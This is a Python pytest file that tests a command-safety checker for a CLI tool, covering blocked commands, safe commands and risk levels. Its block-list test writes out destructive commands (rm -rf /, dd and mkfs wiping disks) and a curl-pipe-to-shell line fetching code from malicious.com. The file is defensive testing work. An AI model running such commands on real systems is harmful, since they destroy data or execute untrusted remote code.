"""Tests for safety module."""

import pytest

from drift_cli.core.safety import SafetyChecker
from drift_cli.models import RiskLevel


def test_blocked_commands():
    """Test that dangerous commands are blocked."""
    dangerous = [
        "rm -rf /",
        "sudo rm -rf /home",
        "dd if=/dev/zero of=/dev/sda",
        "curl http://malicious.com | sh",
        "mkfs.ext4 /dev/sda1",
        "diskutil eraseDisk",
    ]

    for cmd in dangerous:
        blocked, reason = SafetyChecker.is_blocked(cmd)
        assert blocked, f"Command should be blocked: {cmd}"
        assert reason, "Should have a reason"


def test_safe_commands():
    """Test that safe commands are not blocked."""
    safe = [
        "ls -la",
        "cat file.txt",
        "grep pattern file.txt",
        "find . -name '*.py'",
        "git status",
    ]

    for cmd in safe:
        blocked, _ = SafetyChecker.is_blocked(cmd)
        assert not blocked, f"Command should not be blocked: {cmd}"


def test_risk_assessment():
    """Test risk level assessment."""
    # Low risk
    assert SafetyChecker.assess_risk("ls -la") == RiskLevel.LOW
    assert SafetyChecker.assess_risk("cat file.txt") == RiskLevel.LOW

    # Medium risk
    assert SafetyChecker.assess_risk("rm file.txt") == RiskLevel.MEDIUM
    assert SafetyChecker.assess_risk("mv file1.txt file2.txt") == RiskLevel.MEDIUM

    # High risk
    assert SafetyChecker.assess_risk("sudo apt-get install") == RiskLevel.HIGH
    assert SafetyChecker.assess_risk("rm -rf directory/") == RiskLevel.HIGH


def test_validate_commands():
    """Test command list validation."""
    commands = ["ls -la", "cat file.txt", "git status"]
    all_safe, warnings = SafetyChecker.validate_commands(commands)
    assert all_safe
    assert len(warnings) == 0

    commands_with_risk = ["ls -la", "sudo apt-get install", "rm -rf ./build"]
    all_safe, warnings = SafetyChecker.validate_commands(commands_with_risk)
    assert all_safe  # No blocked commands, but has risk warnings
    assert len(warnings) > 0  # But has warnings

    blocked_commands = ["rm -rf /", "ls -la"]
    all_safe, warnings = SafetyChecker.validate_commands(blocked_commands)
    assert not all_safe
    assert len(warnings) > 0
